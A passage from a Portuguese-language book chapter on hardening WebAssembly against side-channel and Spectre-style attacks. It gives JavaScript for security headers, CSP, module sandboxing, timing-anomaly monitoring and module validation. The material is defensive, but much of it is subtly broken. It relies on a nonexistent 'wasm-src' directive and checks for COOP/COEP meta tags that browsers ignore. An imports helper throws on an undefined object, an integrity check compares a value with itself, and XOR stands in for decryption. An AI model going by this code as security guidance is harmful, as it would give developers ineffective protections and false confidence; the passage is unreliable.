            enableSiteIsolation: true,
            enableCOOP: true,
            enableCOEP: true,
            enableCSP: true,
            restrictSharedArrayBuffer: true,
            enableMemoryIsolation: true,
        };
    }

    // Configurar headers de segurança
    configureSecurityHeaders() {
        return {
            'Cross-Origin-Opener-Policy': 'same-origin',
            'Cross-Origin-Embedder-Policy': 'require-corp',
            'Cross-Origin-Resource-Policy': 'cross-origin',
            'Content-Security-Policy': this.generateCSP(),
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        };
    }

    // Gerar Content Security Policy
    generateCSP() {
        const directives = [
            "default-src 'self'",
            "script-src 'self' 'unsafe-eval'",  // Necessário para JIT
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data:",
            "font-src 'self'",
            "connect-src 'self'",
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "frame-ancestors 'none'",
            "sandbox allow-scripts allow-same-origin",
        ];

        return directives.join('; ');
    }

    // Configurar SharedArrayBuffer de forma segura
    configureSharedArrayBuffer() {
        if (this.config.restrictSharedArrayBuffer) {
            // Verificar Cross-Origin Isolation
            if (!self.crossOriginIsolated) {
                console.warn('Cross-Origin Isolation não está ativo');
                return null;
            }

            // Criar SharedArrayBuffer com tamanho limitado
            const maxSize = 1024 * 1024; // 1MB
            const sab = new SharedArrayBuffer(maxSize);

            return {
                buffer: sab,
                maxSize,
                restrictions: [
                    'Tamanho limitado a 1MB',
                    'Apenas para comunicação entre threads',
                    'Não armazenar dados sensíveis',
                ]
            };
        }

        return null;
    }

    // Configurar isolamento de memória
    configureMemoryIsolation() {
        return {
            // Limitar tamanho da memória Wasm
            maxMemoryPages: 256, // 16MB

            // Configurar Growth limits
            memoryGrowth: false,

            // Habilitar bounds checking
            boundsChecking: true,

            // Configurar stack limits
            maxStackSize: 1024 * 1024, // 1MB

            // Habilitar heap protection
            heapProtection: true,
        };
    }

    // Configurar Content Security Policy para Wasm
    configureWasmCSP() {
        return {
            'wasm-unsafe-eval': true,  // Necessário para Wasm
            'wasm-src': "'self'",
        };
    }

    // Verificar configuração de segurança
    verifySecurityConfiguration() {
        const issues = [];

        // Verificar COOP/COEP
        if (this.config.enableCOOP && !document.querySelector('meta[http-equiv="Cross-Origin-Opener-Policy"]')) {
            issues.push('COOP não configurado');
        }

        if (this.config.enableCOEP && !document.querySelector('meta[http-equiv="Cross-Origin-Embedder-Policy"]')) {
            issues.push('COEP não configurado');
        }

        // Verificar SharedArrayBuffer
        if (this.config.restrictSharedArrayBuffer && typeof SharedArrayBuffer === 'undefined') {
            issues.push('SharedArrayBuffer não disponível');
        }

        // Verificar CSP
        if (this.config.enableCSP) {
            const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
            if (!meta) {
                issues.push('CSP não configurado via meta tag');
            }
        }

        return {
            secure: issues.length === 0,
            issues
        };
    }

    // Aplicar hardening completo
    applyHardening() {
        const headers = this.configureSecurityHeaders();
        const sharedArrayBuffer = this.configureSharedArrayBuffer();
        const memoryIsolation = this.configureMemoryIsolation();
        const wasmCSP = this.configureWasmCSP();
        const verification = this.verifySecurityConfiguration();

        return {
            headers,
            sharedArrayBuffer,
            memoryIsolation,
            wasmCSP,
            verification,
            recommendations: this.getRecommendations()
        };
    }

    // Obter recomendações
    getRecommendations() {
        return [
            'Habilitar Cross-Origin Isolation para SharedArrayBuffer',
            'Usar COOP/COEP headers em todas as páginas',
            'Limitar tamanho de memória Wasm',
            'Habilitar bounds checking em runtime',
            'Monitorar comportamento de cache',
            'Usar implementações constant-time para operações sensíveis',
            'Implementar detecção de anomalias de timing',
        ];
    }
}

// Exemplo de uso
const hardening = new WasmRuntimeHardening();
const config = hardening.applyHardening();

console.log('Configuração de Hardening:');
console.log(JSON.stringify(config, null, 2));
```

### 10.10.3 Configuração do Navegador para Segurança de Wasm

```javascript
// Configuração do navegador para segurança de Wasm

// 1. Configuração de Site Isolation
function configureSiteIsolation() {
    // Site Isolation é habilitado por padrão no Chrome 67+
    // e no Firefox (Fission)

    // Verificar se está ativo
    const isIsolated = window.crossOriginIsolated;

    if (!isIsolated) {
        console.warn('Site Isolation não está ativo');
        console.warn('Isso pode permitir ataques Spectre cross-origin');
    }

    return {
        enabled: isIsolated,
        recommendation: isIsolated
            ? 'Site Isolation está ativo'
            : 'Habilitar Site Isolation via headers COOP/COEP'
    };
}

// 2. Configuração de JIT Hardening
function configureJITHardening() {
    // Navegadores modernos aplicam JIT hardening automaticamente
    // mas podemos verificar e configurar

    return {
        // V8 (Chrome/Edge) JIT hardening
        v8: {
            jitless: false,  // Desabilitar JIT (reduz performance)
            codeIntegrity: true,
            controlFlowIntegrity: true,
        },

        // SpiderMonkey (Firefox) JIT hardening
        spiderMonkey: {
            ionEnabled: true,
            baselineEnabled: true,
            wasmTiering: true,
        },

        // JavaScriptCore (Safari) JIT hardening
        javascriptCore: {
            jitEnabled: true,
            wasmCompilationTier: 'llint',
        }
    };
}

// 3. Configuração de Content Security Policy
function configureCSPForWasm() {
    const cspDirectives = {
        'default-src': ["'self'"],
        'script-src': ["'self'", "'unsafe-eval'"],  // Necessário para Wasm
        'wasm-src': ["'self'"],
        'style-src': ["'self'", "'unsafe-inline'"],
        'img-src': ["'self'", 'data:', 'blob:'],
        'font-src': ["'self'"],
        'connect-src': ["'self'"],
        'object-src': ["'none'"],
        'base-uri': ["'self'"],
        'form-action': ["'self'"],
        'frame-ancestors': ["'none'"],
        'sandbox': ['allow-scripts', 'allow-same-origin'],
    };

    // Converter para string CSP
    const cspString = Object.entries(cspDirectives)
        .map(([key, values]) => `${key} ${values.join(' ')}`)
        .join('; ');

    return {
        directives: cspDirectives,
        string: cspString,
        metaTag: `<meta http-equiv="Content-Security-Policy" content="${cspString}">`
    };
}

// 4. Configuração de Cross-Origin Policies
function configureCrossOriginPolicies() {
    return {
        // Cross-Origin-Opener-Policy
        coop: {
            value: 'same-origin',
            description: 'Isola a origem no contexto de abertura',
            header: 'Cross-Origin-Opener-Policy: same-origin'
        },

        // Cross-Origin-Embedder-Policy
        coep: {
            value: 'require-corp',
            description: 'Exige CORP para todos os recursos',
            header: 'Cross-Origin-Embedder-Policy: require-corp'
        },

        // Cross-Origin-Resource-Policy
        corp: {
            value: 'cross-origin',
            description: 'Permite acesso cross-origin',
            header: 'Cross-Origin-Resource-Policy: cross-origin'
        }
    };
}

// 5. Configuração de SharedArrayBuffer Restrictions
function configureSharedArrayBufferRestrictions() {
    return {
        enabled: self.crossOriginIsolated,

        restrictions: [
            'Apenas disponível com Cross-Origin Isolation',
            'Tamanho limitado pelo navegador',
            'Não deve ser exposto para código não confiável',
            'Usar apenas para comunicação entre threads',
        ],

        bestPractices: [
            'Não armazenar dados sensíveis no SharedArrayBuffer',
            'Usar Atomics para sincronização',
            'Limitar número de threads que acessam o SharedArrayBuffer',
            'Monitorar uso de SharedArrayBuffer',
        ]
    };
}

// 6. Verificação completa de configuração de segurança
function verifyBrowserSecurityConfiguration() {
    const config = {
        siteIsolation: configureSiteIsolation(),
        jitHardening: configureJITHardening(),
        csp: configureCSPForWasm(),
        crossOrigin: configureCrossOriginPolicies(),
        sharedArrayBuffer: configureSharedArrayBufferRestrictions(),
    };

    // Verificar se todas as configurações estão corretas
    const issues = [];

    if (!config.siteIsolation.enabled) {
        issues.push('Site Isolation não está ativo');
    }

    if (!config.crossOrigin.coop) {
        issues.push('COOP não configurado');
    }

    if (!config.crossOrigin.coep) {
        issues.push('COEP não configurado');
    }

    return {
        configuration: config,
        secure: issues.length === 0,
        issues,
        recommendations: [
            'Habilitar Cross-Origin Isolation',
            'Configurar COOP/COEP headers',
            'Usar Content Security Policy',
            'Limitar SharedArrayBuffer',
            'Monitorar comportamento de Wasm',
        ]
    };
}
```

### 10.10.4 Content Security Policy para Wasm

```javascript
// Content Security Policy para Wasm

// CSP específico para WebAssembly
const wasmCSP = {
    // Diretrizes básicas
    defaultSrc: ["'self'"],

    // Script source - necessário para Wasm
    scriptSrc: [
        "'self'",
        "'unsafe-eval'",  // Necessário para JIT
        "'wasm-unsafe-eval'",  // Específico para Wasm
    ],

    // Wasm source
    wasmSrc: ["'self'"],

    // Style source
    styleSrc: ["'self'", "'unsafe-inline'"],

    // Image source
    imgSrc: ["'self'", "data:", "blob:"],

    // Font source
    fontSrc: ["'self'"],

    // Connect source
    connectSrc: ["'self'"],

    // Object source
    objectSrc: ["'none'"],

    // Base URI
    baseUri: ["'self'"],

    // Form action
    formAction: ["'self'"],

    // Frame ancestors
    frameAncestors: ["'none'"],

    // Sandbox
    sandbox: [
        "allow-scripts",
        "allow-same-origin",
        "allow-forms",
        "allow-popups",
    ],

    // Report URI (para monitoramento)
    reportUri: "/csp-report",
};

// Gerar string CSP
function generateCSPString(directives) {
    return Object.entries(directives)
        .map(([key, values]) => {
            // Converter camelCase para kebab-case
            const kebabKey = key.replace(/([A-Z])/g, '-$1').toLowerCase();
            return `${kebabKey} ${Array.isArray(values) ? values.join(' ') : values}`;
        })
        .join('; ');
}

// Aplicar CSP
function applyCSP() {
    const cspString = generateCSPString(wasmCSP);

    // Criar meta tag
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = cspString;
    document.head.appendChild(meta);

    // Log para debug
    console.log('CSP aplicado:', cspString);

    return cspString;
}

// CSP para diferentes contextos
const cspContexts = {
    // Página principal
    mainPage: {
        ...wasmCSP,
        // Permitir eval para JIT
        scriptSrc: [...wasmCSP.scriptSrc, "'unsafe-eval'"],
    },

    // Web Worker
    webWorker: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        wasmSrc: ["'self'"],
    },

    // SharedArrayBuffer context
    sharedArrayBuffer: {
        ...wasmCSP,
        // Headers adicionais necessários
        crossOriginOpenerPolicy: 'same-origin',
        crossOriginEmbedderPolicy: 'require-corp',
    },
};

// Verificar se CSP está configurado corretas
function verifyCSP() {
    const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');

    if (!meta) {
        return {
            configured: false,
            error: 'CSP meta tag não encontrada'
        };
    }

    const content = meta.content;

    // Verificar diretivas essenciais
    const requiredDirectives = [
        'default-src',
        'script-src',
        'wasm-src',
        'object-src',
    ];

    const missingDirectives = requiredDirectives.filter(
        directive => !content.includes(directive)
    );

    return {
        configured: true,
        content,
        missingDirectives,
        secure: missingDirectives.length === 0
    };
}

// Exemplo de uso
applyCSP();
console.log('Verificação CSP:', verifyCSP());
```

### 10.10.5 Isolamento de Recursos e Compartimentalização

```javascript
// Isolamento de recursos e compartimentalização

// 1. Isolamento de módulos Wasm
class WasmModuleIsolator {
    constructor() {
        this.modules = new Map();
        this.sandboxes = new Map();
    }

    // Criar sandbox isolado para módulo Wasm
    createSandbox(moduleId, config = {}) {
        const sandbox = {
            id: moduleId,
            memory: new WebAssembly.Memory({
                initial: config.initialPages || 256,
                maximum: config.maximumPages || 512,
                shared: config.shared || false,
            }),
            imports: {},
            exports: {},
            permissions: config.permissions || ['read', 'write'],
            createdAt: Date.now(),
        };

        // Configurar imports seguros
        sandbox.imports = {
            env: {
                memory: sandbox.memory,
            },
            // Adicionar apenas imports necessários
            ...this.createSafeImports(config),
        };

        this.sandboxes.set(moduleId, sandbox);
        return sandbox;
    }

    // Criar imports seguros
    createSafeImports(config) {
        const safeImports = {};

        // Console (apenas para debug)
        if (config.enableConsole) {
            safeImports.console = {
                log: console.log,
                warn: console.warn,
                error: console.error,
            };
        }

        // Tempo (para medições)
        if (config.enableTimer) {
            safeImports.env.performance_now = () => performance.now();
        }

        // SharedArrayBuffer (se necessário)
        if (config.enableSharedArrayBuffer && self.crossOriginIsolated) {
            safeImports.env.shared_buffer = new SharedArrayBuffer(1024);
        }

        return safeImports;
    }

    // Carregar módulo no sandbox
    async loadModule(moduleId, wasmBytes) {
        const sandbox = this.sandboxes.get(moduleId);
        if (!sandbox) {
            throw new Error(`Sandbox ${moduleId} não encontrado`);
        }

        const { instance } = await WebAssembly.instantiate(wasmBytes, sandbox.imports);

        // Capturar exports
        sandbox.exports = instance.exports;

        // Registrar módulo
        this.modules.set(moduleId, {
            instance,
            sandbox,
            loadedAt: Date.now(),
        });

        return instance;
    }

    // Executar função no sandbox
    execute(moduleId, functionName, ...args) {
        const module = this.modules.get(moduleId);
        if (!module) {
            throw new Error(`Módulo ${moduleId} não encontrado`);
        }

        const func = module.instance.exports[functionName];
        if (!func) {
            throw new Error(`Função ${functionName} não encontrada`);
        }

        // Verificar permissões
        if (!this.hasPermission(moduleId, 'execute')) {
            throw new Error(`Módulo ${moduleId} não tem permissão de execução`);
        }

        // Executar com tratamento de erros
        try {
            return func(...args);
        } catch (error) {
            console.error(`Erro ao executar ${functionName}:`, error);
            throw error;
        }
    }

    // Verificar permissões
    hasPermission(moduleId, permission) {
        const sandbox = this.sandboxes.get(moduleId);
        if (!sandbox) {
            return false;
        }

        return sandbox.permissions.includes(permission);
    }

    // Obter status de isolamento
    getIsolationStatus() {
        const status = {};

        for (const [moduleId, sandbox] of this.sandboxes) {
            status[moduleId] = {
                memorySize: sandbox.memory.buffer.byteLength,
                permissions: sandbox.permissions,
                hasConsole: !!sandbox.imports.console,
                hasTimer: !!sandbox.imports.env.performance_now,
                hasSharedArrayBuffer: !!sandbox.imports.env.shared_buffer,
            };
        }

        return status;
    }
}

// 2. Compartimentalização de dados
class DataCompartmentalizer {
    constructor() {
        this.compartments = new Map();
    }

    // Criar compartimento para dados sensíveis
    createCompartment(compartmentId, config = {}) {
        const compartment = {
            id: compartmentId,
            memory: new ArrayBuffer(config.size || 1024 * 1024), // 1MB default
            accessLog: [],
            permissions: config.permissions || ['read'],
            encryption: config.encryption || false,
            createdAt: Date.now(),
        };

        // Criptografar se necessário
        if (compartment.encryption) {
            compartment.key = this.generateEncryptionKey();
        }

        this.compartments.set(compartmentId, compartment);
        return compartment;
    }

    // Gerar chave de criptografia
    generateEncryptionKey() {
        return crypto.getRandomValues(new Uint8Array(32));
    }

    // Acessar dados no compartimento
    access(compartmentId, offset, size) {
        const compartment = this.compartments.get(compartmentId);
        if (!compartment) {
            throw new Error(`Compartimento ${compartmentId} não encontrado`);
        }

        // Verificar permissões
        if (!compartment.permissions.includes('read')) {
            throw new Error(`Sem permissão de leitura no compartimento ${compartmentId}`);
        }

        // Registrar acesso
        compartment.accessLog.push({
            offset,
            size,
            timestamp: Date.now(),
        });

        // Retornar view dos dados
        const view = new Uint8Array(compartment.memory, offset, size);
        return compartment.encryption ? this.decrypt(view, compartment.key) : view;
    }

    // Descriptografar dados
    decrypt(data, key) {
        // Implementação simplificada
        // Em produção, usar AES-GCM ou similar
        const decrypted = new Uint8Array(data.length);
        for (let i = 0; i < data.length; i++) {
            decrypted[i] = data[i] ^ key[i % key.length];
        }
        return decrypted;
    }

    // Obter log de acessos
    getAccessLog(compartmentId) {
        const compartment = this.compartments.get(compartmentId);
        if (!compartment) {
            throw new Error(`Compartimento ${compartmentId} não encontrado`);
        }

        return compartment.accessLog;
    }

    // Verificar integridade
    verifyIntegrity(compartmentId) {
        const compartment = this.compartments.get(compartmentId);
        if (!compartment) {
            throw new Error(`Compartimento ${compartmentId} não encontrado`);
        }

        // Verificar se o tamanho da memória está correto
        const expectedSize = compartment.memory.byteLength;
        const actualSize = compartment.memory.byteLength;

        return {
            valid: expectedSize === actualSize,
            expectedSize,
            actualSize,
        };
    }
}

// 3. Exemplo de uso
const isolator = new WasmModuleIsolator();
const compartmentalizer = new DataCompartmentalizer();

// Criar sandbox para módulo Wasm
const sandbox = isolator.createSandbox('crypto-module', {
    initialPages: 256,
    maximumPages: 512,
    permissions: ['read', 'write', 'execute'],
    enableTimer: true,
});

// Criar compartimento para dados sensíveis
const compartment = compartmentalizer.createCompartment('user-data', {
    size: 1024 * 1024,
    permissions: ['read'],
    encryption: true,
});

console.log('Status de Isolamento:', isolator.getIsolationStatus());
console.log('Verificação de Integridade:', compartmentalizer.verifyIntegrity('user-data'));
```

### 10.10.6 Monitoramento e Detecção de Anomalias

```javascript
// Monitoramento e detecção de anomalias

class SideChannelMonitor {
    constructor() {
        this.baseline = null;
        this.anomalies = [];
        this.metrics = {
            timing: [],
            cache: [],
            memory: [],
        };
    }

    // Estabelecer baseline de comportamento normal
    establishBaseline(measurements, iterations = 10000) {
        const baseline = {
            timing: this.analyzeTiming(measurements.timing),
            cache: this.analyzeCache(measurements.cache),
            memory: this.analyzeMemory(measurements.memory),
            establishedAt: Date.now(),
        };

        this.baseline = baseline;
        return baseline;
    }

    // Analisar timing
    analyzeTiming(times) {
        const n = times.length;
        const mean = times.reduce((a, b) => a + b, 0) / n;
        const variance = times.reduce((sum, x) => sum + Math.pow(x - mean, 2), 0) / n;
        const stdDev = Math.sqrt(variance);

        return {
            mean,
            stdDev,
            variance,
            min: Math.min(...times),
            max: Math.max(...times),
            samples: n,
        };
    }

    // Analisar cache
    analyzeCache(cacheHits) {
        const hitRate = cacheHits.filter(x => x).length / cacheHits.length;

        return {
            hitRate,
            missRate: 1 - hitRate,
            samples: cacheHits.length,
        };
    }

    // Analisar memória
    analyzeMemory(memoryAccesses) {
        const uniqueAddresses = new Set(memoryAccesses).size;

        return {
            uniqueAddresses,
            totalAccesses: memoryAccesses.length,
            accessPattern: this.detectAccessPattern(memoryAccesses),
        };
    }

    // Detectar padrão de acesso
    detectAccessPattern(accesses) {
        // Verificar se há padrão sequencial
        let sequentialCount = 0;
        for (let i = 1; i < accesses.length; i++) {
            if (accesses[i] - accesses[i - 1] === 1) {
                sequentialCount++;
            }
        }

        const sequentialRate = sequentialCount / (accesses.length - 1);

        return {
            sequentialRate,
            isSequential: sequentialRate > 0.8,
        };
    }

    // Detectar anomalias
    detectAnomalies(currentMeasurements) {
        if (!this.baseline) {
            throw new Error('Baseline não estabelecida');
        }

        const anomalies = [];

        // Verificar timing
        const currentTiming = this.analyzeTiming(currentMeasurements.timing);
        const timingAnomaly = this.checkTimingAnomaly(currentTiming);

        if (timingAnomaly) {
            anomalies.push({
                type: 'timing',
                severity: timingAnomaly.severity,
                details: timingAnomaly,
            });
        }

        // Verificar cache
        const currentCache = this.analyzeCache(currentMeasurements.cache);
        const cacheAnomaly = this.checkCacheAnomaly(currentCache);

        if (cacheAnomaly) {
            anomalies.push({
                type: 'cache',
                severity: cacheAnomaly.severity,
                details: cacheAnomaly,
            });
        }

        // Verificar memória
        const currentMemory = this.analyzeMemory(currentMeasurements.memory);
        const memoryAnomaly = this.checkMemoryAnomaly(currentMemory);

        if (memoryAnomaly) {
            anomalies.push({
                type: 'memory',
                severity: memoryAnomaly.severity,
                details: memoryAnomaly,
            });
        }

        this.anomalies.push(...anomalies);
        return anomalies;
    }

    // Verificar anomalia de timing
    checkTimingAnomaly(current) {
        const baseline = this.baseline.timing;

        const meanDiff = Math.abs(current.mean - baseline.mean);
        const stdDiff = Math.abs(current.stdDev - baseline.stdDev);

        // Calcular z-score
        const zScoreMean = meanDiff / baseline.stdDev;
        const zScoreStd = stdDiff / baseline.stdDev;

        if (zScoreMean > 3 || zScoreStd > 3) {
            return {
                severity: 'high',
                zScoreMean,
                zScoreStd,
                meanDiff,
                stdDiff,
            };
        }

        if (zScoreMean > 2 || zScoreStd > 2) {
            return {
                severity: 'medium',
                zScoreMean,
                zScoreStd,
                meanDiff,
                stdDiff,
            };
        }

        return null;
    }

    // Verificar anomalia de cache
    checkCacheAnomaly(current) {
        const baseline = this.baseline.cache;

        const hitRateDiff = Math.abs(current.hitRate - baseline.hitRate);

        if (hitRateDiff > 0.2) {
            return {
                severity: 'high',
                hitRateDiff,
                currentHitRate: current.hitRate,
                baselineHitRate: baseline.hitRate,
            };
        }

        if (hitRateDiff > 0.1) {
            return {
                severity: 'medium',
                hitRateDiff,
                currentHitRate: current.hitRate,
                baselineHitRate: baseline.hitRate,
            };
        }

        return null;
    }

    // Verificar anomalia de memória
    checkMemoryAnomaly(current) {
        const baseline = this.baseline.memory;

        const accessDiff = Math.abs(current.totalAccesses - baseline.totalAccesses);
        const patternChanged = current.accessPattern.isSequential !== baseline.accessPattern.isSequential;

        if (accessDiff > baseline.totalAccesses * 0.5 || patternChanged) {
            return {
                severity: 'high',
                accessDiff,
                patternChanged,
                currentPattern: current.accessPattern,
                baselinePattern: baseline.accessPattern,
            };
        }

        return null;
    }

    // Gerar relatório
    generateReport() {
        const report = {
            timestamp: Date.now(),
            baselineEstablished: !!this.baseline,
            totalAnomalies: this.anomalies.length,
            anomaliesByType: {
                timing: this.anomalies.filter(a => a.type === 'timing').length,
                cache: this.anomalies.filter(a => a.type === 'cache').length,
                memory: this.anomalies.filter(a => a.type === 'memory').length,
            },
            anomaliesBySeverity: {
                high: this.anomalies.filter(a => a.severity === 'high').length,
                medium: this.anomalies.filter(a => a.severity === 'medium').length,
                low: this.anomalies.filter(a => a.severity === 'low').length,
            },
            anomalies: this.anomalies,
        };

        return report;
    }

    // Alertar sobre anomalias críticas
    alertOnCriticalAnomalies() {
        const criticalAnomalies = this.anomalies.filter(a => a.severity === 'high');

        if (criticalAnomalies.length > 0) {
            console.error('ALERTA: Anomalias críticas detectadas!');
            criticalAnomalies.forEach(anomaly => {
                console.error(`  - ${anomaly.type}: ${JSON.stringify(anomaly.details)}`);
            });

            // Em produção, aqui enviaríamos notificação
            // ou tomariamos ações corretivas
        }

        return criticalAnomalies;
    }
}

// Exemplo de uso
const monitor = new SideChannelMonitor();

// Medir comportamento normal
const normalMeasurements = {
    timing: Array.from({ length: 10000 }, () => Math.random() * 100 + 50),
    cache: Array.from({ length: 10000 }, () => Math.random() > 0.3),
    memory: Array.from({ length: 10000 }, () => Math.floor(Math.random() * 256)),
};

// Estabelecer baseline
monitor.establishBaseline(normalMeasurements);

// Medir comportamento atual
const currentMeasurements = {
    timing: Array.from({ length: 10000 }, () => Math.random() * 120 + 60),  // Timing leak
    cache: Array.from({ length: 10000 }, () => Math.random() > 0.4),  // Cache leak
    memory: Array.from({ length: 10000 }, () => Math.floor(Math.random() * 256)),
};

// Detectar anomalias
const anomalies = monitor.detectAnomalies(currentMeasurements);
console.log('Anomalias detectadas:', anomalies);

// Gerar relatório
const report = monitor.generateReport();
console.log('Relatório:', report);
```

### 10.10.7 Mitigações em Nível de Rede

```javascript
// Mitigações em nível de rede

// 1. Headers de segurança para Wasm
const securityHeaders = {
    // Previne ataques cross-origin
    'Cross-Origin-Opener-Policy': 'same-origin',
    'Cross-Origin-Embedder-Policy': 'require-corp',
    'Cross-Origin-Resource-Policy': 'cross-origin',

    // Previne MIME sniffing
    'X-Content-Type-Options': 'nosniff',

    // Previne clickjacking
    'X-Frame-Options': 'DENY',

    // Força HTTPS
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',

    // Content Security Policy
    'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-eval'; wasm-src 'self'",
};

// 2. Configuração de CORS para Wasm
const corsConfig = {
    // Para módulos Wasm
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, HEAD, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Max-Age': '86400',

    // Para SharedArrayBuffer
    'Cross-Origin-Resource-Policy': 'cross-origin',
};

// 3. Rate limiting para requisições Wasm
class RateLimiter {
    constructor(maxRequests = 100, windowMs = 60000) {
        this.maxRequests = maxRequests;
        this.windowMs = windowMs;
        this.requests = new Map();
    }

    isAllowed(clientId) {
        const now = Date.now();
        const windowStart = now - this.windowMs;

        // Limpar requisições antigas
        if (this.requests.has(clientId)) {
            const clientRequests = this.requests.get(clientId);
            this.requests.set(clientId, clientRequests.filter(t => t > windowStart));
        }

        // Verificar limite
        const clientRequests = this.requests.get(clientId) || [];
        if (clientRequests.length >= this.maxRequests) {
            return false;
        }

        // Adicionar requisição atual
        clientRequests.push(now);
        this.requests.set(clientId, clientRequests);

        return true;
    }
}

// 4. Validação de módulos Wasm
class WasmModuleValidator {
    constructor() {
        this.allowedModules = new Set();
        this.blockedModules = new Set();
    }

    validateModule(wasmBytes) {
        // Verificar magic number
        const magicNumber = wasmBytes.slice(0, 4);
        if (magicNumber[0] !== 0x00 || magicNumber[1] !== 0x61 ||
            magicNumber[2] !== 0x73 || magicNumber[3] !== 0x6d) {
            return {
                valid: false,
                error: 'Magic number inválido'
            };
        }

        // Verificar versão
        const version = wasmBytes.slice(4, 8);
        if (version[0] !== 0x01 || version[1] !== 0x00 ||
            version[2] !== 0x00 || version[3] !== 0x00) {
            return {
                valid: false,
                error: 'Versão Wasm não suportada'
            };
        }

        // Verificar se está na lista de bloqueados
        const hash = this.hashModule(wasmBytes);
        if (this.blockedModules.has(hash)) {
            return {
                valid: false,
                error: 'Módulo bloqueado'
            };
        }

        return {
            valid: true,
            hash,
            size: wasmBytes.length,
        };
    }

    hashModule(wasmBytes) {
        // Hash simplificado (em produção, usar SHA-256)
        let hash = 0;
        for (let i = 0; i < wasmBytes.length; i++) {
            hash = ((hash << 5) - hash) + wasmBytes[i];
            hash |= 0;
        }
        return hash.toString(16);
    }

    blockModule(hash) {
        this.blockedModules.add(hash);
    }

    allowModule(hash) {
        this.allowedModules.add(hash);
        this.blockedModules.delete(hash);
    }
}

// 5. Monitoramento de rede
class NetworkMonitor {
    constructor() {
        this.traffic = [];
        this.suspiciousPatterns = [];
    }

    logRequest(request) {
        this.traffic.push({
            ...request,
            timestamp: Date.now(),
        });

        // Verificar padrões suspeitos
        this.checkSuspiciousPatterns(request);
    }

    checkSuspiciousPatterns(request) {
        // Verificar se há muitas requisições de módulos Wasm
        const wasmRequests = this.traffic.filter(t =>
            t.url && t.url.endsWith('.wasm')
        );

        if (wasmRequests.length > 100) {
            this.suspiciousPatterns.push({
                type: 'excessive_wasm_requests',
                count: wasmRequests.length,
                timestamp: Date.now(),
            });
        }

        // Verificar se há requisições de tamanhos incomuns
        if (request.size && request.size > 10 * 1024 * 1024) { // > 10MB
            this.suspiciousPatterns.push({
                type: 'large_wasm_module',
                size: request.size,
                url: request.url,
                timestamp: Date.now(),
            });
        }
    }

    getReport() {
        return {
            totalRequests: this.traffic.length,
            wasmRequests: this.traffic.filter(t => t.url && t.url.endsWith('.wasm')).length,
            suspiciousPatterns: this.suspiciousPatterns,
            recommendations: this.getRecommendations(),
        };
    }

    getRecommendations() {
        const recommendations = [];

        if (this.suspiciousPatterns.length > 0) {
            recommendations.push('Investigar padrões suspeitos de tráfego');
        }

        if (this.traffic.length > 1000) {
            recommendations.push('Considerar rate limiting para requisições Wasm');
        }

        return recommendations;
    }
}

// Exemplo de uso
const rateLimiter = new RateLimiter(100, 60000);
const validator = new WasmModuleValidator();
const networkMonitor = new NetworkMonitor();

// Verificar se cliente pode fazer requisição
const clientId = 'user123';
if (rateLimiter.isAllowed(clientId)) {
    // Validar módulo Wasm
    const wasmBytes = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
    const validation = validator.validateModule(wasmBytes);

    if (validation.valid) {
        // Log da requisição
        networkMonitor.logRequest({
            url: '/module.wasm',
            size: wasmBytes.length,
            clientId,
        });

        console.log('Módulo Wasm válido:', validation);
    } else {
        console.error('Módulo Wasm inválido:', validation.error);
    }
} else {
    console.error('Rate limit excedido para cliente:', clientId);
}

// Gerar relatório de rede
console.log('Relatório de Rede:', networkMonitor.getReport());
```

### 10.10.8 Considerações de Hardware

```javascript
// Considerações de hardware

// 1. Informações sobre o hardware
function getHardwareInfo() {
    const info = {
        // Número de cores
        cores: navigator.hardwareConcurrency || 'desconhecido',

        // Memória disponível
        memory: navigator.deviceMemory || 'desconhecido',

        // Plataforma
        platform: navigator.platform,

        // User Agent
        userAgent: navigator.userAgent,

        // Features do navegador
        features: {
            sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
            webAssembly: typeof WebAssembly !== 'undefined',
            webWorkers: typeof Worker !== 'undefined',
            crossOriginIsolated: self.crossOriginIsolated,
        },
    };

    return info;
}

// 2. Verificar mitigações de hardware
function checkHardwareMitigations() {
    const mitigations = {
        // Site Isolation
        siteIsolation: self.crossOriginIsolated,

        // SharedArrayBuffer (requer Cross-Origin Isolation)
        sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',

        // WebAssembly
        webAssembly: typeof WebAssembly !== 'undefined',

        // Features de segurança
        securityFeatures: {
            csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'),
            coop: !!document.querySelector('meta[http-equiv="Cross-Origin-Opener-Policy"]'),
            coep: !!document.querySelector('meta[http-equiv="Cross-Origin-Embedder-Policy"]'),
        },
    };

    return mitigations;
}

// 3. Recomendações baseadas no hardware
function getHardwareRecommendations() {
    const info = getHardwareInfo();
    const mitigations = checkHardwareMitigations();

    const recommendations = [];

    // Recomendações baseadas em cores
    if (info.cores > 8) {
        recommendations.push('Múltiplos cores podem aumentar superfície de ataque de cache');
    }

    // Recomendações baseadas em memória
    if (info.memory && info.memory < 4) {
        recommendations.push('Memória limitada pode afetar mitigações de isolamento');
    }

    // Recomendações baseadas em features
    if (!mitigations.siteIsolation) {
        recommendations.push('Habilitar Site Isolation para proteção cross-origin');
    }

    if (!mitigations.sharedArrayBuffer) {
        recommendations.push('SharedArrayBuffer não disponível - medições de timing limitadas');
    }

    if (!mitigations.securityFeatures.csp) {
        recommendations.push('Configurar Content Security Policy');
    }

    if (!mitigations.securityFeatures.coop) {
        recommendations.push('Configurar Cross-Origin-Opener-Policy');
    }

    if (!mitigations.securityFeatures.coep) {
        recommendations.push('Configurar Cross-Origin-Embedder-Policy');
    }

    return {
        hardware: info,
        mitigations,
        recommendations,
    };
}

// 4. Monitoramento de performance do hardware
class HardwarePerformanceMonitor {
    constructor() {
        this.metrics = {
            cpu: [],
            memory: [],
